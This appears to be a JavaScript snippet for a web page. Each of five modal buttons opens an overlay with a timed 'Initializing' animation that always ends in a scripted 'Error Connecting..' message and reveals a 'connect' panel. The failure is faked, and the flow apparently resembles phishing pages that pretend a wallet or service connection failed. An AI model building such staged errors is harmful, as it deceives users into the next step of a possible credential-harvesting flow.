
let click_me_btn = document.querySelector("#modalsec > div > div > div > div > div:nth-child(1)")
let click_me_btn2 = document.querySelector("#modalsec > div > div > div > div > div:nth-child(2)")
let click_me_btn3 = document.querySelector("#modalsec > div > div > div > div > div:nth-child(3)")
let click_me_btn4 = document.querySelector("#modalsec > div > div > div > div > div:nth-child(4)")
let click_me_btn5 = document.querySelector("#modalsec > div > div > div > div > div:nth-child(5)")


let first_popup = document.querySelector(".overlay")
let modal =  document.getElementById("modalsec")

click_me_btn.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
    modal.style.display = "none";
}
click_me_btn2.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
    modal.style.display = "none";
}
click_me_btn3.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
    modal.style.display = "none";
}
click_me_btn4.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
    modal.style.display = "none";
}
click_me_btn5.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
    modal.style.display = "none";
}




function loadings() {
    var a =  setTimeout(function () {
        loading.innerHTML = "Initializing.";
      }, 1)
    
      var a = setTimeout(function() {
        loading.innerHTML = "Initializing..";
      }, 500)
    
      var a = setTimeout(function() {
        loading.innerHTML = "Initializing...";
      }, 1000)

      var a = setTimeout(function() {
        loading.innerHTML = "Initializing....";
      }, 2000)

      var a = setTimeout(function() {
        loading.innerHTML = "Initializing.....";
      }, 3000)

      var a = setTimeout(function() {
        loading.innerHTML = "Error Connecting.."
        connect.style.display = "flex"
      }, 4000)
     
    }
    